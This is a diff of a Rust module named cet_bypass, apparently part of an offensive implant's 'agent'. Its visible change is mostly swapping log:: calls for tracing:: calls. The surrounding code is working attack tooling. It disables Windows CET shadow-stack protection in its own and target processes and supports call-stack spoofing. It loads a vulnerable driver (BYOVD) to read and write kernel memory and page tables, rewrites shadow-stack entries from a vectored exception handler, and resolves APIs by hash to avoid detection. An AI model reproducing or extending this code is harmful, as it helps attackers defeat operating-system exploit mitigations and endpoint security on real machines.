@@ -133,7 +133,7 @@ const fn const_hash_wstr(units: &[u16]) -> u32 {
 // ─── Minimal VEH Types ────────────────────────────────────────────────────
 //
 // Local definitions of EXCEPTION_POINTERS and related structures for the
-// VEH shadow-stack handler.  Avoids importing winapi::um::winnt types.
+// VEH shadow-stack handler.  Avoids importing  types.
 
 /// Maximum number of exception parameters.
 const EXCEPTION_MAXIMUM_PARAMETERS: usize = 15;
@@ -258,7 +258,7 @@ static CET_CONFIG: OnceLock<CetConfig> = OnceLock::new();
 /// the configuration for runtime use.
 pub fn init_from_config(config: &common::config::CetBypassConfig) {
     if INITIALIZED.swap(true, Ordering::SeqCst) {
-        log::warn!("cet_bypass: init_from_config called more than once, ignoring");
+        tracing::warn!("cet_bypass: init_from_config called more than once, ignoring");
         return;
     }
 
@@ -273,7 +273,7 @@ pub fn init_from_config(config: &common::config::CetBypassConfig) {
     });
 
     if !config.enabled {
-        log::info!("cet_bypass: module disabled by config");
+        tracing::info!("cet_bypass: module disabled by config");
         return;
     }
 
@@ -281,7 +281,7 @@ pub fn init_from_config(config: &common::config::CetBypassConfig) {
     let build = get_windows_build();
     let _ = CACHED_BUILD.set(build);
 
-    log::info!(
+    tracing::info!(
         "cet_bypass: init (enabled={}, prefer_policy_disable={}, fallback_to_call_chain={}, veh_shadow_fix={}, build={})",
         config.enabled,
         config.prefer_policy_disable,
@@ -297,10 +297,10 @@ pub fn init_from_config(config: &common::config::CetBypassConfig) {
     let state = CET_STATE.load(Ordering::SeqCst);
     if state == CET_ENABLED_CAN_DISABLE && PREFER_POLICY_DISABLE.load(Ordering::SeqCst) {
         if disable_cet_for_self() {
-            log::info!("cet_bypass: CET disabled for agent process via mitigation policy");
+            tracing::info!("cet_bypass: CET disabled for agent process via mitigation policy");
             CET_STATE.store(CET_DISABLED, Ordering::SeqCst);
         } else {
-            log::warn!(
+            tracing::warn!(
                 "cet_bypass: failed to disable CET for agent process (policy disable failed)"
             );
         }
@@ -361,17 +361,17 @@ pub fn prepare_spoofing(target_handle: Option<HANDLE>) -> CetAction {
             if PREFER_POLICY_DISABLE.load(Ordering::SeqCst) {
                 let handle = target_handle.unwrap_or_else(|| (-1isize) as *mut _);
                 if disable_cet_for_process(handle) {
-                    log::debug!(
+                    tracing::debug!(
                         "cet_bypass: CET disabled for target process via mitigation policy"
                     );
                     CetAction::Disabled
                 } else if FALLBACK_TO_CALL_CHAIN.load(Ordering::SeqCst) {
-                    log::debug!(
+                    tracing::debug!(
                         "cet_bypass: policy disable failed, falling back to call-chain approach"
                     );
                     CetAction::UseCallChain
                 } else {
-                    log::warn!(
+                    tracing::warn!(
                         "cet_bypass: CET policy disable failed and call-chain fallback is disabled"
                     );
                     CetAction::Abort
@@ -386,14 +386,14 @@ pub fn prepare_spoofing(target_handle: Option<HANDLE>) -> CetAction {
             if FALLBACK_TO_CALL_CHAIN.load(Ordering::SeqCst) {
                 CetAction::UseCallChain
             } else {
-                log::warn!(
+                tracing::warn!(
                     "cet_bypass: CET cannot be disabled and call-chain fallback is disabled"
                 );
                 CetAction::Abort
             }
         }
         _ => {
-            log::error!("cet_bypass: unknown CET state {}", state);
+            tracing::error!("cet_bypass: unknown CET state {}", state);
             CetAction::Abort
         }
     }
@@ -446,7 +446,7 @@ fn detect_cet_state() {
     // CET shadow stacks are only hardware-enforced on Win 11 24H2+.
     // Earlier builds may have software CET but it is not enforced.
     if build < 26100 {
-        log::info!(
+        tracing::info!(
             "cet_bypass: build {} < 26100, CET not hardware-enforced",
             build
         );
@@ -478,7 +478,7 @@ fn detect_cet_state() {
     let get_policy_fn = match get_policy_fn {
         Some(f) => f,
         None => {
-            log::warn!("cet_bypass: failed to resolve GetProcessMitigationPolicy");
+            tracing::warn!("cet_bypass: failed to resolve GetProcessMitigationPolicy");
             CET_STATE.store(CET_DISABLED, Ordering::SeqCst);
             return;
         }
@@ -496,7 +496,7 @@ fn detect_cet_state() {
     if result == 0 {
         // GetProcessMitigationPolicy failed — assume CET is not present.
         let err = dynamic_get_last_error();
-        log::warn!(
+        tracing::warn!(
             "cet_bypass: GetProcessMitigationPolicy failed (error {}), assuming CET disabled",
             err
         );
@@ -507,14 +507,14 @@ fn detect_cet_state() {
     // Check if CFG is enabled (bit 0 of Flags).
     let cfg_enabled = cfg_policy.Flags & 1 != 0;
     if !cfg_enabled {
-        log::info!("cet_bypass: CFG not enabled, CET shadow stacks not active");
+        tracing::info!("cet_bypass: CFG not enabled, CET shadow stacks not active");
         CET_STATE.store(CET_DISABLED, Ordering::SeqCst);
         return;
     }
 
     // CFG is enabled.  On Win11 24H2+, CET shadow stacks are active.
     // Try to disable via policy to determine if we CAN disable.
-    log::info!(
+    tracing::info!(
         "cet_bypass: CFG enabled on build {}, CET shadow stacks likely active",
         build
     );
@@ -522,10 +522,10 @@ fn detect_cet_state() {
     // Try a test disable: attempt to set CET policy.  If it succeeds,
     // we're in state 1 (can disable).  If access denied, state 2.
     if can_disable_cet_policy() {
-        log::info!("cet_bypass: CET is enabled and CAN be disabled via policy");
+        tracing::info!("cet_bypass: CET is enabled and CAN be disabled via policy");
         CET_STATE.store(CET_ENABLED_CAN_DISABLE, Ordering::SeqCst);
     } else {
-        log::info!("cet_bypass: CET is enabled and CANNOT be disabled (insufficient privileges)");
+        tracing::info!("cet_bypass: CET is enabled and CANNOT be disabled (insufficient privileges)");
         CET_STATE.store(CET_ENABLED_CANNOT_DISABLE, Ordering::SeqCst);
     }
 }
@@ -598,7 +598,7 @@ fn can_disable_cet_policy() -> bool {
             return false;
         }
         // Other errors might be transient — assume we can try.
-        log::debug!(
+        tracing::debug!(
             "cet_bypass: SetProcessMitigationPolicy returned error {}, assuming can-disable",
             err
         );
@@ -647,7 +647,7 @@ fn disable_cet_for_process(handle: HANDLE) -> bool {
         let set_fn = match set_fn {
             Some(f) => f,
             None => {
-                log::warn!("cet_bypass: failed to resolve SetProcessMitigationPolicy, trying NtSetInformationProcess");
+                tracing::warn!("cet_bypass: failed to resolve SetProcessMitigationPolicy, trying NtSetInformationProcess");
                 return disable_cet_nt(handle);
             }
         };
@@ -664,7 +664,7 @@ fn disable_cet_for_process(handle: HANDLE) -> bool {
 
         if result == 0 {
             let err = dynamic_get_last_error();
-            log::warn!(
+            tracing::warn!(
                 "cet_bypass: SetProcessMitigationPolicy failed for self (error {})",
                 err
             );
@@ -737,10 +737,10 @@ fn disable_cet_nt(handle: HANDLE) -> bool {
             };
 
             if status == STATUS_SUCCESS {
-                log::debug!("cet_bypass: NtSetInformationProcess succeeded for CET disable");
+                tracing::debug!("cet_bypass: NtSetInformationProcess succeeded for CET disable");
                 true
             } else {
-                log::warn!(
+                tracing::warn!(
                     "cet_bypass: NtSetInformationProcess returned NTSTATUS {:#010X}",
                     status as u32,
                 );
@@ -748,7 +748,7 @@ fn disable_cet_nt(handle: HANDLE) -> bool {
             }
         }
         Err(e) => {
-            log::warn!(
+            tracing::warn!(
                 "cet_bypass: could not resolve NtSetInformationProcess SSN: {}",
                 e
             );
@@ -1068,7 +1068,7 @@ fn call_single_step(step: &CallChainStep, args: &[u64]) -> Option<i32> {
     let dll_base = match unsafe { pe_resolve::get_module_handle_by_hash(step.dll_hash) } {
         Some(b) => b,
         None => {
-            log::warn!(
+            tracing::warn!(
                 "cet_bypass: could not resolve module by hash {:#010X}",
                 step.dll_hash,
             );
@@ -1080,7 +1080,7 @@ fn call_single_step(step: &CallChainStep, args: &[u64]) -> Option<i32> {
     {
         Some(a) => a,
         None => {
-            log::warn!(
+            tracing::warn!(
                 "cet_bypass: could not resolve function by hash {:#010X}",
                 step.func_hash,
             );
@@ -1159,7 +1159,7 @@ fn call_single_step(step: &CallChainStep, args: &[u64]) -> Option<i32> {
                 )
             }
             n => {
-                log::warn!(
+                tracing::warn!(
                     "cet_bypass: unsupported arg_count {} for dll_hash={:#010X} func_hash={:#010X}",
                     n,
                     step.dll_hash,
@@ -1260,12 +1260,12 @@ fn get_kernel_base() -> Option<u64> {
             0,
             &mut buf_size as *mut u32
         ) {
-            log::warn!("cet_bypass: NtQuerySystemInformation (size query) resolution failed: {e}");
+            tracing::warn!("cet_bypass: NtQuerySystemInformation (size query) resolution failed: {e}");
             return None;
         }
     }
     if buf_size == 0 {
-        log::warn!("cet_bypass: NtQuerySystemInformation returned zero buffer size");
+        tracing::warn!("cet_bypass: NtQuerySystemInformation returned zero buffer size");
         return None;
     }
 
@@ -1282,12 +1282,12 @@ fn get_kernel_base() -> Option<u64> {
     } {
         Ok(status) => status,
         Err(e) => {
-            log::warn!("cet_bypass: NtQuerySystemInformation resolution failed: {e}");
+            tracing::warn!("cet_bypass: NtQuerySystemInformation resolution failed: {e}");
             return None;
         }
     };
     if status < 0 {
-        log::warn!(
+        tracing::warn!(
             "cet_bypass: NtQuerySystemInformation failed: 0x{:08X}",
             status as u32
         );
@@ -1433,7 +1433,7 @@ fn kernel_translate_va_to_pa(
     let pml4_base = cr3 & PFN_MASK;
     let pml4e = read_entry(pml4_base, pml4_idx)?;
     if pml4e & PTE_PRESENT == 0 {
-        log::debug!(
+        tracing::debug!(
             "cet_bypass: PML4E not present for VA 0x{:016X}",
             virtual_address
         );
@@ -1444,7 +1444,7 @@ fn kernel_translate_va_to_pa(
     let pdpt_base = pml4e & PFN_MASK;
     let pdpte = read_entry(pdpt_base, pdpt_idx)?;
     if pdpte & PTE_PRESENT == 0 {
-        log::debug!(
+        tracing::debug!(
             "cet_bypass: PDPTE not present for VA 0x{:016X}",
             virtual_address
         );
@@ -1459,7 +1459,7 @@ fn kernel_translate_va_to_pa(
     let pd_base = pdpte & PFN_MASK;
     let pde = read_entry(pd_base, pd_idx)?;
     if pde & PTE_PRESENT == 0 {
-        log::debug!(
+        tracing::debug!(
             "cet_bypass: PDE not present for VA 0x{:016X}",
             virtual_address
         );
@@ -1474,7 +1474,7 @@ fn kernel_translate_va_to_pa(
     let pt_base = pde & PFN_MASK;
     let pte = read_entry(pt_base, pt_idx)?;
     if pte & PTE_PRESENT == 0 {
-        log::debug!(
+        tracing::debug!(
             "cet_bypass: PTE not present for VA 0x{:016X}",
             virtual_address
         );
@@ -1516,7 +1516,7 @@ fn resolve_cr3(
     }
     let eprocess_addr = u64::from_le_bytes(ptr_buf);
     if eprocess_addr == 0 {
-        log::warn!("cet_bypass: PsInitialSystemProcess is NULL");
+        tracing::warn!("cet_bypass: PsInitialSystemProcess is NULL");
         return None;
     }
 
@@ -1534,11 +1534,11 @@ fn resolve_cr3(
     }
     let cr3 = u64::from_le_bytes(cr3_buf);
     if cr3 == 0 || cr3 & 0xFFF != 0 {
-        log::warn!("cet_bypass: invalid CR3 value: 0x{:016X}", cr3);
+        tracing::warn!("cet_bypass: invalid CR3 value: 0x{:016X}", cr3);
         return None;
     }
 
-    log::debug!("cet_bypass: resolved CR3: 0x{:016X}", cr3);
+    tracing::debug!("cet_bypass: resolved CR3: 0x{:016X}", cr3);
     Some(cr3)
 }
 
@@ -1578,7 +1578,7 @@ fn resolve_current_kthread(
     // Read the KPCR pointer for our CPU: KiProcessorBlock[cpu_num].
     let kpcr_ptr = kernel_read_u64(driver, device_handle, cr3, kpb_addr + (cpu_num as u64) * 8)?;
     if kpcr_ptr == 0 {
-        log::warn!("cet_bypass: KiProcessorBlock[{}] is NULL", cpu_num);
+        tracing::warn!("cet_bypass: KiProcessorBlock[{}] is NULL", cpu_num);
         return None;
     }
 
@@ -1586,11 +1586,11 @@ fn resolve_current_kthread(
     const CURRENT_THREAD_OFFSET: u64 = 0x188;
     let kthread = kernel_read_u64(driver, device_handle, cr3, kpcr_ptr + CURRENT_THREAD_OFFSET)?;
     if kthread == 0 {
-        log::warn!("cet_bypass: KPCR.CurrentThread is NULL");
+        tracing::warn!("cet_bypass: KPCR.CurrentThread is NULL");
         return None;
     }
 
-    log::debug!(
+    tracing::debug!(
         "cet_bypass: resolved KTHREAD 0x{:016X} via KiProcessorBlock[{}] (KPCR 0x{:016X})",
         kthread,
         cpu_num,
@@ -1633,7 +1633,7 @@ unsafe extern "system" fn veh_shadow_stack_handler(exception_info: *mut Exceptio
         None => return EXCEPTION_CONTINUE_SEARCH,
     };
 
-    log::warn!(
+    tracing::warn!(
         "cet_bypass: #CP exception at RIP=0x{:016X}, attempting shadow-stack fixup",
         context.Rip
     );
@@ -1642,7 +1642,7 @@ unsafe extern "system" fn veh_shadow_stack_handler(exception_info: *mut Exceptio
     let deployed = match crate::kernel_callback::deploy::get_deployed_driver() {
         Some(d) => d,
         None => {
-            log::error!("cet_bypass: no BYOVD driver deployed, cannot fix shadow stack");
+            tracing::error!("cet_bypass: no BYOVD driver deployed, cannot fix shadow stack");
             return EXCEPTION_CONTINUE_SEARCH;
         }
     };
@@ -1650,7 +1650,7 @@ unsafe extern "system" fn veh_shadow_stack_handler(exception_info: *mut Exceptio
     let device_handle = match deployed.device_handle {
         Some(h) => h,
         None => {
-            log::error!("cet_bypass: no device handle in deployed driver");
+            tracing::error!("cet_bypass: no device handle in deployed driver");
             return EXCEPTION_CONTINUE_SEARCH;
         }
     };
@@ -1659,7 +1659,7 @@ unsafe extern "system" fn veh_shadow_stack_handler(exception_info: *mut Exceptio
     let kernel_base = match get_kernel_base() {
         Some(b) => b,
         None => {
-            log::error!("cet_bypass: failed to resolve kernel base");
+            tracing::error!("cet_bypass: failed to resolve kernel base");
             return EXCEPTION_CONTINUE_SEARCH;
         }
     };
@@ -1667,7 +1667,7 @@ unsafe extern "system" fn veh_shadow_stack_handler(exception_info: *mut Exceptio
     let cr3 = match resolve_cr3(driver, device_handle, kernel_base) {
         Some(c) => c,
         None => {
-            log::error!("cet_bypass: failed to resolve CR3");
+            tracing::error!("cet_bypass: failed to resolve CR3");
             return EXCEPTION_CONTINUE_SEARCH;
         }
     };
@@ -1680,7 +1680,7 @@ unsafe extern "system" fn veh_shadow_stack_handler(exception_info: *mut Exceptio
     let ss_offset = match shadow_stack_offset_for_build(build) {
         Some(off) => off,
         None => {
-            log::error!(
+            tracing::error!(
                 "cet_bypass: build {} not in shadow-stack offset table — refusing to guess",
                 build
             );
@@ -1692,7 +1692,7 @@ unsafe extern "system" fn veh_shadow_stack_handler(exception_info: *mut Exceptio
     let kthread = match resolve_current_kthread(driver, device_handle, cr3, kernel_base) {
         Some(t) => t,
         None => {
-            log::error!("cet_bypass: failed to resolve current KTHREAD");
+            tracing::error!("cet_bypass: failed to resolve current KTHREAD");
             return EXCEPTION_CONTINUE_SEARCH;
         }
     };
@@ -1702,13 +1702,13 @@ unsafe extern "system" fn veh_shadow_stack_handler(exception_info: *mut Exceptio
         match kernel_read_u64(driver, device_handle, cr3, kthread + ss_offset as u64) {
             Some(p) => p,
             None => {
-                log::error!("cet_bypass: failed to read shadow-stack pointer from KTHREAD");
+                tracing::error!("cet_bypass: failed to read shadow-stack pointer from KTHREAD");
                 return EXCEPTION_CONTINUE_SEARCH;
             }
         };
 
     if shadow_stack_ptr == 0 {
-        log::error!("cet_bypass: shadow-stack pointer is NULL");
+        tracing::error!("cet_bypass: shadow-stack pointer is NULL");
         return EXCEPTION_CONTINUE_SEARCH;
     }
 
@@ -1726,7 +1726,7 @@ unsafe extern "system" fn veh_shadow_stack_handler(exception_info: *mut Exceptio
         addr => addr,
     };
 
-    log::debug!(
+    tracing::debug!(
         "cet_bypass: SSP=0x{:016X}, RSP=0x{:016X}, expected ret=0x{:016X}, RIP=0x{:016X}",
         shadow_stack_ptr,
         rsp,
@@ -1747,7 +1747,7 @@ unsafe extern "system" fn veh_shadow_stack_handler(exception_info: *mut Exceptio
         if entry == context.Rip {
             // Found the shadow stack entry that has the old (pre-spoof) return address.
             // Overwrite it with the expected return address so the `ret` succeeds.
-            log::info!(
+            tracing::info!(
                 "cet_bypass: found mismatched shadow entry at SSP-{} (0x{:016X}): \
                  0x{:016X} → 0x{:016X}",
                 i + 1,
@@ -1757,10 +1757,10 @@ unsafe extern "system" fn veh_shadow_stack_handler(exception_info: *mut Exceptio
             );
 
             if kernel_write_u64(driver, device_handle, cr3, entry_addr, expected_return_addr) {
-                log::info!("cet_bypass: shadow-stack fixup successful, resuming execution");
+                tracing::info!("cet_bypass: shadow-stack fixup successful, resuming execution");
                 found = true;
             } else {
-                log::error!("cet_bypass: failed to write shadow-stack fixup");
+                tracing::error!("cet_bypass: failed to write shadow-stack fixup");
             }
             break;
         }
@@ -1769,7 +1769,7 @@ unsafe extern "system" fn veh_shadow_stack_handler(exception_info: *mut Exceptio
     if found {
         EXCEPTION_CONTINUE_EXECUTION
     } else {
-        log::error!("cet_bypass: could not locate matching shadow-stack entry for fixup");
+        tracing::error!("cet_bypass: could not locate matching shadow-stack entry for fixup");
         EXCEPTION_CONTINUE_SEARCH
     }
 }
@@ -1787,7 +1787,7 @@ fn install_veh_shadow_fix() {
     } {
         Some(b) => b,
         None => {
-            log::error!("cet_bypass: failed to resolve kernel32 for AddVectoredExceptionHandler");
+            tracing::error!("cet_bypass: failed to resolve kernel32 for AddVectoredExceptionHandler");
             return;
         }
     };
@@ -1800,7 +1800,7 @@ fn install_veh_shadow_fix() {
     } {
         Some(a) => a,
         None => {
-            log::error!("cet_bypass: failed to resolve AddVectoredExceptionHandler");
+            tracing::error!("cet_bypass: failed to resolve AddVectoredExceptionHandler");
             return;
         }
     };
@@ -1815,12 +1815,12 @@ fn install_veh_shadow_fix() {
     // Install as first handler (first=1) so we see exceptions before anyone else.
     let handle = unsafe { add_veh(1, veh_shadow_stack_handler) };
     if handle.is_null() {
-        log::error!("cet_bypass: AddVectoredExceptionHandler returned NULL");
+        tracing::error!("cet_bypass: AddVectoredExceptionHandler returned NULL");
         return;
     }
 
     VEH_INSTALLED.store(true, Ordering::SeqCst);
-    log::info!("cet_bypass: VEH shadow-stack fix handler installed successfully");
+    tracing::info!("cet_bypass: VEH shadow-stack fix handler installed successfully");
 }
 
 /// Install the VEH shadow-stack fix handler (no-op fallback).
@@ -1829,7 +1829,7 @@ fn install_veh_shadow_fix() {
 /// operations and the VEH handler would be useless.
 #[cfg(not(feature = "kernel-callback"))]
 fn install_veh_shadow_fix() {
-    log::warn!(
+    tracing::warn!(
         "cet_bypass: veh_shadow_fix is configured but the kernel-callback feature \
          is not enabled — shadow-stack manipulation requires BYOVD kernel access. \
          The VEH handler will not be installed."
@@ -1861,7 +1861,7 @@ fn get_windows_build() -> u32 {
     // P2-16: Fallback using RtlGetVersion via pe_resolve if KUSER_SHARED_DATA
     // value looks invalid.  RtlGetVersion is guaranteed to return accurate
     // version info even when compatibility manifests lie to GetVersionEx.
-    log::debug!(
+    tracing::debug!(
         "cet_bypass: KUSER_SHARED_DATA build {} looks invalid, trying RtlGetVersion fallback",
         masked
     );
@@ -1897,7 +1897,7 @@ fn get_windows_build() -> u32 {
                 };
                 let status = unsafe { rtl_get_version(&mut version_info) };
                 if status >= 0 && version_info.dw_build_number >= 10000 {
-                    log::debug!(
+                    tracing::debug!(
                         "cet_bypass: RtlGetVersion fallback returned build {}",
                         version_info.dw_build_number
                     );
@@ -1905,7 +1905,7 @@ fn get_windows_build() -> u32 {
                 }
             }
         }
-        log::warn!("cet_bypass: RtlGetVersion fallback failed, returning 0");
+        tracing::warn!("cet_bypass: RtlGetVersion fallback failed, returning 0");
     }
 
     0
